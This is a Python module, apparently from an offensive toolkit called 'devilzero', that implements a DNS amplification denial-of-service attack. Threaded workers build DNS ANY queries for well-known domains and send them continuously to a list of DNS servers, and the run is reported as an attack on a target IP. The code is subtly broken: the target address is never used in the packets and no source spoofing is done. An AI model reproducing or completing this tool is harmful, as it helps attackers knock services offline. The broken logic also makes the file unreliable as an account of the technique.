import socket
import random
import struct
import threading
import time

from devilzero.utils import Colors, is_root, print_error, print_warning, print_info, print_success


class DNSAmplification:
    def __init__(self, target_ip, dns_servers, threads=10):
        self.target_ip = target_ip
        self.dns_servers = dns_servers
        self.threads = threads
        self.sent = 0
        self.lock = threading.Lock()

    def build_dns_query(self, domain):
        transaction_id = random.randint(0, 65535)
        flags = 0x0100
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        dns_header = struct.pack('!HHHHHH',
            transaction_id, flags, questions,
            answer_rrs, authority_rrs, additional_rrs)
        query_parts = domain.split('.')
        query_name = b''
        for part in query_parts:
            query_name += bytes([len(part)]) + part.encode()
        query_name += b'\x00'
        query_type = 255
        query_class = 1
        dns_question = query_name + struct.pack('!HH', query_type, query_class)
        return dns_header + dns_question

    def worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        domains = ["google.com", "cloudflare.com", "microsoft.com",
                    "amazon.com", "facebook.com", "netflix.com"]
        while True:
            for dns in self.dns_servers:
                try:
                    domain = random.choice(domains)
                    query = self.build_dns_query(domain)
                    sock.sendto(query, (dns, 53))
                    with self.lock:
                        self.sent += 1
                except Exception:
                    pass

    def start(self, duration=60):
        print_info(f"DNS Amplification targeting {self.target_ip}")
        print_info(f"Using {len(self.dns_servers)} DNS servers, {self.threads} threads")
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
        start = time.time()
        while time.time() - start < duration:
            time.sleep(1)
            with self.lock:
                print(f"\r{Colors.WARNING}Queries sent: {self.sent}{Colors.RESET}", end='')
        print()
        print_success("Amplification attack finished")